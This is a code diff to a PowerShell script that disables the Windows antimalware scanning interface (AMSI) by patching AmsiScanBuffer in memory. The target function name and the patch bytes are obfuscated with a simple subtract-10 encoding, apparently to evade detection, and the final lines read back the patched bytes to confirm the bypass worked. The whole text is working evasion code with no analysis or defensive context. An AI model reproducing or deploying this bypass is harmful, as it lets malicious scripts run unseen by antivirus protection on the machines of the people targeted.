@@ -26,11 +26,22 @@ function fleck {
  return $type.CreateType();
 }
 
-[IntPtr]$LGaudzvo99 = candidate amsi.dll AmsiOpenSession;
+$asdqwe = @(75,119,125,115,93,109,107,120,76,127,112,112,111,124)
+for($i=0;$i -lt $asdqwe.Length;$i++){
+	$asdqwe[$i]=$asdqwe[$i]-10
+}
+[IntPtr]$LGaudzvo99 = candidate amsi.dll $([System.Text.Encoding]::ASCII.getString($asdqwe));
 $HjmYfFIP99 = 0;
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((candidate kernel32.dll VirtualProtect),(fleck @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])));
 $vp.Invoke($LGaudzvo99, 3, 0x40, [ref]$HjmYfFIP99);
-$buf = [Byte[]] (0x48, 0x31, 0xC0); 
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $LGaudzvo99, 3);
+$buf = [Byte[]] (0xc2, 0x61, 0xa, 0x11, 0x8a, 0xcd);
+
+for($i=0;$i -lt $buf.Length;$i++){
+  $buf[$i] = $buf[$i]-10
+}
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $LGaudzvo99, 6);
 $vp.Invoke($LGaudzvo99, 3, 0x20, [ref]$HjmYfFIP99);
 
+$arr = New-Object Byte[] 10;
+[System.Runtime.InteropServices.Marshal]::Copy($LGaudzvo99, $arr, 0, 6);
+$arr -join ","
